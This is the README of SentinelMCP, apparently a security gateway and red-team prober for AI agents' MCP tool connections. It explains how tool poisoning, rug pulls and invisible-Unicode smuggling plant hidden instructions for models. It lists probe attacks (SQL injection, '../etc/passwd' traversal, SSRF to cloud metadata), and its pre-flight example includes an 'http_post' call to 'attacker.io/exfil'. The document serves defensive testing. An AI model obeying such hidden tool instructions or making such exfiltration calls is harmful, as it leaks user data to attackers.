<p align="center">
  <img src="assets/wordmark.svg" alt="SentinelMCP — AI Agent Security Gateway" width="360"/>
</p>

---

**Every tool, verified.**

SentinelMCP is a zero-trust security gateway for MCP (Model Context Protocol) connections.
It sits between your AI agent and the MCP servers it talks to, and inspects every schema,
parameter, output, and context window in real time — catching tool poisoning, rug pulls,
credential theft, prompt injection, and semantic-mosaic attacks in **under 5 ms**, before
your agent acts on them.

It works two ways:

- **Inline (defense)** — proxy live agent↔server traffic and block attacks as they happen.
- **Offensive (discovery)** — actively probe *any* MCP server or agent you point it at and
  produce a red-team vulnerability report. This is how you use SentinelMCP to **find bugs in
  other people's servers and agents** — see [Find bugs in other servers & agents](#find-bugs-in-other-servers--agents).

> **InjecAgent Benchmark:** **67.7% core detection** (L1–L3, deterministic, 42/62 — reproduced in CI) → **77.4% with the local Layer‑4 LLM pass** (48/62, `qwen2.5:7b` via Ollama) at **0% false positives** on benign controls. The LLM lift is model-dependent — a higher-capability model (e.g. Claude Haiku via the Anthropic fallback) recovers more, but is not run in CI (no keys in GitHub). Reproduce: `python benchmarks/injecagent_runner.py` (core) or `--llm` (with a provider). [full scorecard](benchmarks/results/injecagent.md)

---

## Table of contents

- [What it catches](#what-it-catches)
- [How it works — the 4-layer engine](#how-it-works--the-4-layer-engine)
- [Everything in the box](#everything-in-the-box)
- [Find bugs in other servers & agents](#find-bugs-in-other-servers--agents)
- [Quick start — run the CISO demo](#quick-start--run-the-ciso-demo)
- [How someone tests it (step by step)](#how-someone-tests-it-step-by-step)
- [The four ways to integrate](#the-four-ways-to-integrate)
- [Python SDK](#python-sdk)
- [API reference](#api-reference)
- [Configuration](#configuration)
- [Run tests](#run-tests)
- [Project structure](#project-structure)
- [Build status](#build-status)

---

## What it catches

| Attack | OWASP | Layer | How |
|---|---|---|---|
| Tool poisoning (hidden instructions in tool descriptions) | LLM01 | 1 — Schema | Regex + policy scan of tool descriptions on first connect |
| Rug pulls (schema silently changed mid-session) | LLM05 | 1 — Schema | SHA-256 hash-watch + background re-validation every 5 min |
| Shadow / unauthorized MCP servers | LLM05 | 0 — Allowlist | Proxy rejects any target not on the server allowlist |
| Encoded / obfuscated injection (base64, unicode-escape) | LLM01 | 1 + 3 | Decode-then-scan of descriptions and outputs |
| **Approval-view concealment** (invisible Unicode) | LLM01 | 1 + 3 | Detects Tag-block / bidi / zero-width text hidden from the human approval UI, decodes it, and re-scans — see [Differentiators](#what-makes-it-different) |
| Bad / smuggled parameters, privilege escalation | LLM08 | 2 — Param | Strict JSON-Schema validation + dangerous-arg scan, <1 ms, no I/O |
| Output injection & PII/credential exfiltration | LLM02/LLM06 | 3 — Output | Async pattern scan; circuit breaker trips the **next** call |
| Semantic mosaic (benign calls assembling sensitive data) | LLM08 | 4 — Context | TF-IDF sliding window; fires at risk_score > 0.75 |
| Grey-zone / novel attacks | — | 4 — Context | Optional LLM semantic analysis (Ollama-first, Anthropic fallback) |
| Known-bad tools & indicators | LLM05 | 1 — Registry | Match against the SMCP threat registry (CVE-style advisories) |

---

## How it works — the 4-layer engine

One-time schema validation is broken; per-request validation is too slow. SentinelMCP uses a
hybrid where each layer runs only where it's cheap enough to run every time:

| Layer | When it runs | Latency | Catches |
|---|---|---|---|
| **L1 Schema** | Discovery + hash-watch (cached) | ~0 ms on cache hit | Poisoning, rug pulls, known-bad tools |
| **L2 Param** | Every call, **blocking** | <1 ms | Smuggling, privilege escalation, dangerous args |
| **L3 Output** | Every call, **async** (Celery) | 0 ms blocking | Output injection, PII/secret leakage |
| **L4 Context** | Every call, **parallel** | <3 ms | Semantic mosaic, cross-call data assembly |

**The async-output trick:** the agent gets its response immediately; a copy is forked to the
inspector. If a threat is found, the **circuit breaker** blocks the *next* call in
that session — full output coverage with zero added latency on the response path. This is also
how the **Layer-4 LLM classifier runs in production**: a clean-but-suspicious output is
re-checked off the response path (opt-in via `SENTINEL_OUTPUT_LLM_ESCALATION`), and a positive
verdict trips the breaker for the next call — so the LLM-layer detection lift applies live without
adding latency to the response path.

**Proven overhead:** the deterministic path is measured at **end-to-end p95 ≈ 0.7 ms** (p99 ≈ 0.7 ms),
~1,670 req/s under 50× concurrency — reproduce with `make benchmark-latency` ([scorecard](benchmarks/results/latency.md)).

Layer 1 cache records are signed with **HMAC-SHA256 attestation**, so a tampered cache entry is
detected and dropped on read.

---

## Everything in the box

**Detection & policy**
- 4-layer detection engine (schema · param · output · context) + Layer-0 allowlist
- 36+ built-in injection/PII/dangerous-action patterns covering OWASP LLM Top 10
- Encoded-injection decoder (base64 + unicode escapes)
- Hot-reloadable **policy-as-code** engine (`policies/default.yaml`) — add rules without redeploy
- **SMCP threat registry** (`registry/known_bad.json`) — CVE-style advisories with severity + OWASP mapping, queryable over the API
- Optional **LLM semantic analysis** for the grey zone (Ollama-first, Anthropic fallback)

**Gateway modes**
- **Transparent MCP proxy** (`/proxy`) — drop-in JSON-RPC interception with per-layer latency headers
- **Pre-flight analyzer** (`/proxy/analyze`) — get a full threat report on a *planned* session before executing anything
- **Active probe / pentester** (`/probe`) — 7 red-team attacks against any target MCP server
- **REST & A2A adapters** (`/adapters/*`) — wrap a plain REST/OpenAPI service or an agent-to-agent endpoint and gate it through the same engine

**Enterprise & ops**
- Per-tenant **API keys** (`X-Sentinel-Key`) + **JWT/JWKS** for the dashboard, with tenant isolation
- Rate limiting (slowapi) on every route; per-session **circuit breaker**
- **PostgreSQL append-only audit log** with tenant scoping; CSV export
- **Compliance reports** (PCI DSS + SOC 2 + OWASP) as JSON and print-ready HTML
- **Alerts** to Slack / PagerDuty / generic webhooks
- **OpenTelemetry** tracing (Jaeger), **Grafana** dashboards, high-availability profile (Redis Sentinel + Postgres replica)

**Clients & UIs**
- **Python SDK** (`sentinelmcp_sdk`) — sync + async, plus middleware
- **VS Code extension** (`extension/`, packaged `.vsix`) — inline threat surfacing in the editor
- **React dashboard** (`dashboard/`) — live threat feed; **Admin UI** (`admin/`) with a Test Lab
- **SentinelMCP-as-an-MCP-server** (`demo/sentinel_mcp_server.py`) — expose the scanners *as* MCP tools an agent can call, and a **LangGraph research agent** that uses them

---

## Find bugs in other servers & agents

Yes — this is a first-class use case, and it's already built. There are three ways to point
SentinelMCP at *someone else's* MCP server or agent and get findings back.

### 1. Active probe — red-team pentest (`POST /probe`)

Runs live attacks against a target MCP server and returns a scored vulnerability report. Seven
probes today, each mapped to OWASP LLM Top 10:

| Probe | OWASP | What it does |
|---|---|---|
| `prompt_injection` | LLM01 | Scans tool descriptions for injected instructions |
| `rug_pull` | LLM05 | Calls `tools/list` twice, diffs the schema hash |
| `pii_leak` | LLM06 | Calls tools with empty args, scans responses for PII |
| `sql_injection` | LLM07 | Sends SQL payloads, watches for DB error leakage |
| `path_traversal` | LLM07 | Sends `../etc/passwd`, checks for file-content leakage |
| `ssrf` | LLM07 | Sends cloud-metadata URLs, checks if the server fetches them |
| `dos` | LLM04 | Sends a 100 KB payload, measures latency amplification |

```bash
# Probe any MCP server for all 7 vulnerability classes
curl -X POST http://localhost:8888/probe \
  -H "X-Sentinel-Key: dev-key-123" \
  -H "Content-Type: application/json" \
  -d '{"server_url":"http://target-mcp-server:8001","attacks":["all"],"authorized":true}'

# or, if the stack is up:  make probe SERVER=http://target-mcp-server:8001
```

You get back a `risk_score` (0–10), a `risk_level` (SAFE→CRITICAL), and per-attack findings with
severity, evidence, and remediation. Rate-limited (tunable via `SENTINEL_RATE_LIMIT_PROBE`) because
probing is expensive.

> **Shareable report.** Add `"format":"html"` to get a **branded, print-to-PDF assessment** you can
> hand a prospect ("here's what we found in your MCP server, and how we'd defend it") — the
> top-of-funnel design-partner wedge. Save one with `make probe-report SERVER=http://target:8001`.

> **Authorization gate.** Because the probe launches real attacks, every request must carry
> `"authorized": true` — an attestation that you're permitted to security-test the target
> (unauthorized scanning of third-party servers may be illegal). An **SSRF guard** always blocks
> cloud-metadata/link-local targets, and optionally private/loopback ranges
> (`SENTINEL_PROBE_BLOCK_PRIVATE_TARGETS=true` for internet-facing SaaS; left off for in-VPC
> scanning of internal servers).

### 2. Pre-flight analysis — vet an agent's plan (`POST /proxy/analyze`)

Given a target server and a list of tool calls an agent *intends* to make, this fetches the
server's real tool list, runs L1 schema validation, then dry-runs every planned call through
L2 + L4 — returning a PASS/BLOCK verdict per call **without executing anything**. Use it to
audit an agent's behavior before it runs.

```bash
curl -X POST http://localhost:8888/proxy/analyze \
  -H "X-Sentinel-Key: dev-key-123" -H "Content-Type: application/json" \
  -d '{
    "server_url": "http://target-mcp-server:8001",
    "prompt": "summarize customer records",
    "tool_calls": [
      {"name": "query_database", "arguments": {"query": "SELECT * FROM users"}},
      {"name": "http_post", "arguments": {"url": "https://attacker.io/exfil"}}
    ]
  }'
```

### 3. Inline proxy — catch bugs in production traffic (`POST /proxy`)

Point the agent's MCP client at SentinelMCP and set `X-MCP-Target` to the real server. Every
JSON-RPC message is inspected; threats are logged to the audit trail and blocked, and the
response carries an `X-Sentinel-Latency` header with per-layer timing. This surfaces bugs and
attacks in *live* agent↔server traffic.

> **Extending the probe set:** each probe is a small async function in
> [app/gateway/probe_router.py](app/gateway/probe_router.py) registered in the `_PROBE_FNS`
> dispatch table. Adding a new attack class (e.g. command injection, auth bypass, tool-shadowing)
> is a matter of writing one function and adding a dispatch entry — a natural next extension.

---

## What makes it different

Most MCP-security tools are either **static scanners** (report-only) or **point-in-time classifiers**. SentinelMCP adds capabilities the research found unmet across the market:

### 🔁 Closed-loop hardening — offense automatically hardens defense
SentinelMCP is the only gateway that owns *both* an offensive probe *and* a defensive policy engine *and* a threat registry — and wires them together. Run a probe with `harden: true` and every **confirmed** vulnerability is automatically synthesized into (1) a versioned registry advisory and (2) a **live detection rule** installed into the running gateway with no restart. A weakness found on one server instantly protects the whole fleet — no human authoring a signature.

```bash
curl -X POST http://localhost:8888/probe \
  -H "X-Sentinel-Key: dev-key-123" -H "Content-Type: application/json" \
  -d '{"server_url":"http://target:8001","attacks":["all"],"harden":true,"authorized":true}'
# → report.hardening: { advisories_created: [...], rules_installed: [...] }
```

The synthesis is deterministic and idempotent (stable IDs per server+attack), so re-probing never duplicates artifacts. Findings that are PROTECTED/INCONCLUSIVE produce nothing.

**See it live:** bring up the stack (`make demo`) then `make demo-closed-loop` — it probes a deliberately-vulnerable MCP server, auto-synthesizes advisories + rules, and shows the exploit payload getting blocked at `/gateway/invoke` afterward. The whole loop is proven in-process by [test_closed_loop_integration.py](tests/test_closed_loop_integration.py) (no Docker needed).

### 👁️ Approval-view fidelity — catches text hidden from the human reviewer
Attackers hide instructions in tool descriptions using the Unicode **Tag block** (ASCII smuggled as non-rendering codepoints), **bidirectional overrides**, or **zero-width** runs — invisible in the approval dialog but tokenized by the model. SentinelMCP measures the divergence between the human-rendered view and the model-ingested view, **decodes** the hidden payload, and re-scans it. Near-zero false positives (legitimate tool text has none of these), and it correctly ignores emoji joiners.

### 📈 Cross-session / fleet drift detection — temporal rug-pulls
Intra-run hash-watch only sees a description change *within* one session. SentinelMCP keeps a **longitudinal fingerprint history per (server, tool)** and scores semantic drift against the first-seen baseline — catching slow, across-session mutations *and* **cross-tenant divergence** (the same tool served a different description to different tenants = a targeted attack). Non-blocking by design (legit tools do update); surfaced via `GET /gateway/drift` and alerts. Research ranked this the #1 unmet differentiator.

### 📊 Context-oversharing meter — OWASP MCP10
Per-call PII scanning can't answer "how much sensitive data has this session pushed out, and to how many destinations?" SentinelMCP accounts for sensitive-data **egress per destination server** across a session and flags two conditions OWASP MCP10 raises: exceeding a per-server budget, and sensitive data **fanning out** across too many servers. See `GET /gateway/exposure/{session_id}`.

These four mechanisms are covered in the [provisional patent draft #2](docs/provisional-patent-draft-2.md).

---

## Quick start — run the CISO demo

Everything runs in Docker — no local Redis, no local Postgres.

**Prerequisites:** [Docker Desktop](https://www.docker.com/products/docker-desktop/) running, and Python 3.9+ for the demo script.

```bash
git clone https://github.com/saratala/sentinelmcp
cd sentinelmcp
pip install httpx            # the demo script's only dependency

# Start the full stack (redis + postgres + api + worker) and the demo MCP servers
docker-compose up -d
docker-compose --profile demo up -d

# Wait ~10s, then verify
curl http://localhost:8888/health          # {"status":"ok","version":"0.2.0",...}

# Run the 3-scenario demo: clean server passes, poisoned server is intercepted, rug pull is caught
python demo/demo.py
```

**Expected output:**

```
──────────────────────────────────────────────────────────────────
  Step 1 — Clean MCP Server
──────────────────────────────────────────────────────────────────
  ✓  PASSED — all 4 tools verified clean          Latency: 3.2ms

  Step 2 — Poisoned MCP Server (CVE-2025-54136)
  🚨  ATTACK INTERCEPTED — 2 threat(s) detected
  Threat: TOOL_POISONING · Pattern: exfiltration_url · Confidence: 95%

  Step 3 — Rug Pull Detection
  ✓  Initial validation passed — schema cached
  🚨  RUG PULL DETECTED — schema changed mid-session
```

### The UIs

| URL | What | Login |
|---|---|---|
| http://localhost:8888/docs | Interactive API (Swagger) | `X-Sentinel-Key: dev-key-123` |
| http://localhost:5173 | React live threat dashboard | — |
| http://localhost:3000 | Grafana dashboards | `admin` / `sentinel` |
| http://localhost:9000 | Admin UI + Test Lab (`make admin`) | — |

**Tear down:** `docker-compose --profile demo down` then `docker-compose down -v`.

---

## Observability

Every request and finding is traceable end-to-end.

- **Correlation IDs** — each request gets an `X-Request-ID` (client-supplied or generated), returned in the response and **bound into every structured log line** for that request, alongside the OpenTelemetry `trace_id` when tracing is on. One id ties together the gateway logs, the threat events, and the Jaeger trace for any agent call.
- **Structured logs** — JSON in production (SIEM-ready), console in dev. Auth failures are audited as dedicated `auth_failure` events (reason, route, client IP, key prefix, request id).
- **Prometheus metrics** at `GET /metrics` (open, like `/health`): request rate/latency/in-flight per route, plus security counters — `sentinelmcp_threats_total{threat_type,layer,source}`, `auth_failures_total`, `probe_runs_total`, `circuit_breaker_trips_total`, `drift_detections_total`, `context_oversharing_total`, `rate_limited_total`, `requests_rejected_total`.
- **Dashboards** — `docker-compose --profile observability up -d` starts **Jaeger** (:16686, traces), **Prometheus** (:9090), and wires a **Grafana** dashboard ("SentinelMCP — Live Metrics") for all of the above. Historical findings are also queryable via `GET /gateway/threats` and the Postgres-backed Grafana board.

```bash
curl http://localhost:8888/metrics | grep sentinelmcp_threats_total
```

### Scan a real MCP server → vulnerability report in Grafana

Every probe run emits `sentinelmcp_probe_runs_total{risk_level}` and
`sentinelmcp_probe_findings_total{attack_type,severity,verdict}`, which the Grafana
board renders as a live vulnerability assessment (vulns by attack class, by
severity, assessments by risk level, findings over time).

```bash
docker-compose up -d && docker-compose --profile observability up -d   # gateway + Prometheus + Grafana
# Scan a target and close the loop; findings flow into Prometheus → Grafana
make harden SERVER=http://your-mcp-server:PORT
# Grafana → "SentinelMCP — Live Metrics" → "Active Probe — Vulnerability Assessments"
# Plus a shareable per-scan report:  make probe-report SERVER=http://your-mcp-server:PORT
```

### Scanning real open-source MCP servers

The probe speaks real **MCP Streamable HTTP** — it performs the `initialize`
handshake, carries the `Mcp-Session-Id`, and parses both JSON and SSE responses
(with a fallback to plain JSON-RPC for the simple demo servers). So it scans any
HTTP/SSE MCP server directly. Reference servers that default to **stdio** are
fronted with a one-line bridge — a `supergateway` service is included:

```bash
# Wraps the official @modelcontextprotocol/server-filesystem over HTTP on :8009
docker compose --profile oss up -d mcp-bridge
make probe SERVER=http://mcp-bridge:8009/mcp        # scan the real OSS server
# swap the --stdio command in docker-compose.yml for git / github / sqlite / …
```

> Verified live: probing `@modelcontextprotocol/server-filesystem` via the bridge
> returns a real assessment (mostly PROTECTED — it's a well-built server). A sample
> assessment of the *vulnerable* demo server is committed at
> [docs/sample-assessment.html](docs/sample-assessment.html).

---

## How someone tests it (step by step)

A new person evaluating SentinelMCP should follow this path — it goes from "is it alive" to
"I broke into a server with it" in about ten minutes.

**0. Clone & choose a lane.** Docker is the fastest path; a local venv is enough for tests only.

```bash
git clone https://github.com/saratala/sentinelmcp && cd sentinelmcp
```

**1. Run the test suite (no Docker needed).** Proves the detection logic works in isolation —
uses `fakeredis`, so no external services.

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e ".[test]"
PYTHONPATH=. pytest tests/ -v            # 108 tests, all 4 layers + auth + proxy
```

**2. Bring up the stack.**

```bash
docker-compose up -d && docker-compose --profile demo up -d
curl http://localhost:8888/health
```

**3. Watch it catch a live attack.** Run the scripted demo, then open the dashboard at
http://localhost:5173 and re-run it a few times to populate the feed.

```bash
python demo/demo.py
```

**4. Point it at a server and hunt for bugs.** The two demo servers are on ports 8001 (clean)
and 8002 (poisoned) — probe both and compare the reports.

```bash
make probe SERVER=http://localhost:8002     # poisoned → CRITICAL findings
make probe SERVER=http://localhost:8001     # clean → SAFE
make attacks                                # list the 7 probe types
```

**5. Vet a planned agent session** with `/proxy/analyze` (see the example above), or route real
traffic through `/proxy` with an `X-MCP-Target` header.

**6. Pull the compliance evidence.**

```bash
make report            # PCI DSS + SOC 2 + OWASP summary (JSON)
make threats           # recent audit-log events
make stats             # counts by threat type and layer
# print-ready PDF:  open http://localhost:8888/gateway/compliance/report.html
```

**7. (Optional) Try the SDK, the VS Code extension, or SentinelMCP-as-an-MCP-server**
(`make mcp-server`, `make agent`).

> **Auth note:** every gateway route requires an API key. The dev default is `dev-key-123`
> (header `X-Sentinel-Key`). `/health`, `/probe/attacks`, and `/auth/*` are open.

---

## The four ways to integrate

1. **Transparent proxy** — zero code change to the server; agent points its MCP client at
   SentinelMCP with `X-MCP-Target`. Best for production defense.
2. **SDK / API calls** — call `/proxy/analyze` or `/probe` from your own code or CI. Best for
   pre-deploy vetting and continuous scanning.
3. **REST / A2A adapters** — register a plain REST+OpenAPI service or an agent-to-agent endpoint
   (`/adapters/rest/register`, `/adapters/a2a/register`) and gate its calls through the engine.
4. **SentinelMCP-as-an-MCP-server** — expose the scanners themselves as MCP tools so an agent
   (e.g. the included LangGraph research agent) can invoke security checks as part of its plan.

---

## Python SDK

```python
from sentinelmcp_sdk import SentinelClient

sentinel = SentinelClient(api_key="dev-key-123", gateway_url="http://localhost:8888")

# Pre-flight: is this planned session safe?
result = sentinel.analyze(
    "http://target-mcp-server:8001",
    tool_calls=[{"name": "query_db", "arguments": {"query": "SELECT *"}}],
)
if result.is_blocked:
    raise RuntimeError(f"Blocked: {result.threats}")

# Red-team a server
report = sentinel.probe("http://target-mcp-server:8001", attacks=["all"])
print(report["risk_level"], report["vulnerabilities_found"])

# Compliance + audit
print(sentinel.report(days=30))
print(sentinel.threats(days=7))
```

An async client (`AsyncSentinelClient`) and drop-in agent middleware are also available.

---

## API reference

All routes require `X-Sentinel-Key` unless noted.

**Gateway (L1–L4)** — `app/gateway/router.py`
| Method | Path | Purpose |
|---|---|---|
| `GET` | `/health` | Liveness + per-layer latency *(open)* |
| `POST` | `/gateway/validate-schema` | L1 — validate & cache a server's tool schemas |
| `POST` | `/gateway/invoke` | L2+L3+L4 — validate a single tool invocation |
| `POST` | `/gateway/l4/evaluate` | Feed a call sequence straight into L4 (Test Lab) |
| `GET` | `/gateway/inventory` | All monitored servers + cached security status |
| `GET` | `/gateway/drift` | Cross-session drift inventory — temporal rug-pulls + cross-tenant divergence |
| `GET` | `/gateway/exposure/{session_id}` | Context-oversharing summary (OWASP MCP10) |
| `POST` | `/gateway/circuit-breaker/reset` | Unblock a session after review |

**Proxy & analysis** — `app/gateway/proxy_router.py`
| Method | Path | Purpose |
|---|---|---|
| `POST` | `/proxy` | Transparent MCP JSON-RPC proxy (`X-MCP-Target`) |
| `POST` | `/proxy/analyze` | Pre-flight threat report for a planned session |
| `GET/POST/DELETE` | `/allowlist` | Manage the approved-server allowlist (anti-shadow-MCP) |

**Active probe** — `app/gateway/probe_router.py`
| Method | Path | Purpose |
|---|---|---|
| `POST` | `/probe` | Run red-team attacks against a target server |
| `GET` | `/probe/attacks` | List available attacks + OWASP mappings *(open)* |

**Registry, threats & compliance** — `app/gateway/router.py`
| Method | Path | Purpose |
|---|---|---|
| `GET` | `/gateway/registry`, `/gateway/registry/{smcp_id}` | Browse SMCP threat advisories |
| `POST` | `/gateway/registry/check` | Pre-screen tool names/text against known-bad registry |
| `GET` | `/gateway/threats/explain` | Explain a threat type (OWASP + fix) + related advisories |
| `GET` | `/gateway/threats` | Paginated audit log (filter by server/type/since) |
| `GET` | `/gateway/threats/stats` | Aggregate counts by type & layer |
| `GET` | `/gateway/threats/export` | CSV export for compliance |
| `GET` | `/gateway/compliance/report[.html]` | PCI DSS / SOC 2 / OWASP report |

**Keys, auth & adapters** — `keys_router.py` · `auth_router.py` · `adapters_router.py`
| Method | Path | Purpose |
|---|---|---|
| `POST/GET/DELETE` | `/keys` | Per-tenant API key management *(admin scope)* |
| `GET` | `/keys/policy` | Current key/rate-limit policy *(admin scope)* |
| `GET` | `/auth/jwks`, `/auth/status` | JWKS + auth mode *(open)* |
| `POST/GET/DELETE` | `/adapters/rest/*` | Register/gate REST+OpenAPI services |
| `POST/GET` | `/adapters/a2a/*` | Register/gate agent-to-agent endpoints |

Full interactive docs at `http://localhost:8888/docs`.

### RBAC — scoped API keys

Keys carry **scopes** that gate what they can do; `admin` implies all. Create a
narrowly-scoped key (an admin-only operation):

```bash
curl -X POST http://localhost:8888/keys \
  -H "X-Sentinel-Key: <admin-key>" -H "Content-Type: application/json" \
  -d '{"label":"ci-scanner","tenant_id":"acme","scopes":["probe"]}'
```

| Scope | Grants |
|---|---|
| `read` | read-only endpoints (registry, threats, inventory, drift, exposure, explain) |
| `gateway` | the data path (validate / invoke / proxy / adapters) |
| `probe` | the active red-team probe (`/probe`) |
| `admin` | key management, allowlist mutation, circuit-breaker reset (implies all) |

A scope denial returns **403** and is recorded as an `auth_failure` (structured log +
`sentinelmcp_auth_failures_total{reason="missing_scope:…"}`). The dev/env key and any
legacy pre-RBAC keys are treated as fully scoped, so existing deployments are unaffected.

---

## Configuration

All config is environment-driven (pydantic-settings). Copy `.env.example` → `.env`. Key vars:

| Var | Default | Purpose |
|---|---|---|
| `SENTINEL_API_KEY` | `dev-key-123` | Dev API key for `X-Sentinel-Key` |
| `REDIS_URL` | `redis://localhost:6379` | Cache + circuit breaker + context store |
| `DATABASE_URL` | postgres… | Audit log |
| `SCHEMA_CACHE_TTL` | `300` | L1 cache TTL (s) |
| `REVALIDATION_INTERVAL` | `300` | Background rug-pull re-scan interval (s) |
| `SCHEMA_SIGNING_SECRET` | — | HMAC key for cache attestation |
| `LLM_ANALYSIS_ENABLED` | `false` | Turn on L4 LLM grey-zone analysis |
| `LLM_PROVIDER` / `OLLAMA_URL` / `ANTHROPIC_API_KEY` | — | LLM backend for L4 |
| `SLACK_WEBHOOK_URL` / `PAGERDUTY_ROUTING_KEY` | — | Alert sinks |
| `SENTINEL_OTEL_ENDPOINT` | — | OpenTelemetry/Jaeger export |

---

## Run tests

```bash
python -m venv .venv && source .venv/bin/activate
pip install -e ".[test]"
PYTHONPATH=. pytest tests/ -v --cov=app --cov-report=term-missing
```

108 tests across all layers (schema, param, output, context), auth, OWASP patterns, and the
proxy — all use `fakeredis`, so no Redis or Postgres is required.

---

## Project structure

```
sentinelmcp/
├── app/
│   ├── main.py                 # FastAPI app, lifespan, middleware, /health
│   ├── config.py · deps.py     # Settings + dependency injectors
│   ├── gateway/
│   │   ├── schema_layer.py      # L1: cache + hash-watch + rug pull + attestation
│   │   ├── param_layer.py       # L2: JSON-Schema + dangerous-arg validation
│   │   ├── output_layer.py      # L3: async output inspection
│   │   ├── context_layer.py     # L4: TF-IDF semantic mosaic (+ optional LLM)
│   │   ├── validator.py         # Orchestrates L2+L3+L4
│   │   ├── proxy.py             # Transparent MCP proxy core
│   │   ├── router.py            # /gateway/* (validate, invoke, threats, compliance)
│   │   ├── proxy_router.py      # /proxy, /proxy/analyze, /allowlist
│   │   ├── probe_router.py      # /probe active red-team scanner
│   │   ├── adapters_router.py   # /adapters REST + A2A
│   │   ├── keys_router.py · auth_router.py
│   ├── detection/patterns.py   # 36+ injection/PII/dangerous patterns + decoders
│   ├── core/                    # redis, circuit_breaker, policy_engine, registry,
│   │                            #   allowlist, auth, keys, rate_limit, alerts,
│   │                            #   threat_log, llm_analyzer, telemetry, database
│   └── models/                  # Pydantic v2 schemas + SQLAlchemy ORM
├── worker/tasks.py             # Celery async output inspection
├── demo/                       # demo.py, clean/poisoned servers, MCP server, LangGraph agent
├── benchmarks/                 # InjecAgent runner + scorecards
├── registry/known_bad.json     # SMCP threat registry
├── policies/default.yaml       # Policy-as-code rules
├── sentinelmcp_sdk/            # Python SDK (sync + async + middleware)
├── extension/                  # VS Code extension (packaged .vsix)
├── dashboard/ · admin/         # React threat feed + Admin UI/Test Lab
├── grafana/ · helm/            # Dashboards + Kubernetes chart
├── docker-compose.yml · Dockerfile · Makefile · pyproject.toml
└── SKILL.md                    # Authoritative project context
```

---

## Build status

- [x] L1 Schema — cache + rug pull + HMAC attestation + known-bad registry
- [x] L2 Param — JSON-Schema + dangerous-arg validation
- [x] L3 Output — async inspection + circuit breaker
- [x] L4 Context — TF-IDF semantic mosaic + optional LLM grey-zone analysis
- [x] Transparent proxy + pre-flight analyzer + server allowlist
- [x] Active probe (7 red-team attacks, OWASP-mapped)
- [x] Policy-as-code engine + SMCP threat registry
- [x] Auth (API key + JWT/JWKS), rate limiting, per-tenant isolation
- [x] PostgreSQL audit log + CSV export + PCI/SOC2/OWASP compliance reports
- [x] Alerts (Slack/PagerDuty/webhook), OpenTelemetry, Grafana, HA profile
- [x] Python SDK, VS Code extension, React dashboard + Admin UI
- [x] REST + A2A adapters
- [x] InjecAgent benchmark harness (67.7% core, deterministic → 77.4% with local L4 LLM; model-dependent)
- [x] **Closed-loop hardening** — probe findings auto-synthesize live rules + advisories
- [x] **Approval-view fidelity** — invisible-Unicode / tag-block concealment detection
- [x] **Cross-session / fleet drift detection** — temporal rug-pulls + cross-tenant divergence
- [x] **Context-oversharing meter** (OWASP MCP10) — sensitive-egress accounting per destination
- [x] **Production preflight** — refuses to boot with insecure defaults (dev key, wildcard CORS, disabled auth); configurable CORS origins
- [x] **False-positive discipline** — 0% FP on a benign-tool corpus; end-to-end app tests; fixed a ReDoS DoS on non-ASCII output
- [x] **Probe authorization gate** — required authorization attestation + SSRF/cloud-metadata target guard
- [x] **Rate-limit tuning** — per-API-key limits, env-configurable, optional Redis-backed shared storage for HA
- [x] **Observability** — correlation/trace IDs on every log + `X-Request-ID`, Prometheus `/metrics`, Grafana dashboard, structured auth-failure audit
- [x] **Request hardening** — body-size (413) + request/upstream timeouts (504) on the DoS surface
- [x] **RBAC / scoped API keys** — `read`/`gateway`/`probe`/`admin` scopes enforced per route; denials audited (403 + metric); legacy/dev keys stay fully scoped
- [x] **Shareable probe report** — branded, print-to-PDF HTML assessment (`format:"html"` / `make probe-report`) — the design-partner wedge
- [x] **Signals dashboard** — drift, context-oversharing, and closed-loop hardening surfaced live (`/gateway/signals` + dashboard "Signals" tab)
- [ ] Managed cloud / Railway live demo URL
- [ ] SOC 2 Type II (Vanta) — in progress
- [ ] Expanded probe set (command injection, auth bypass, tool-shadowing)
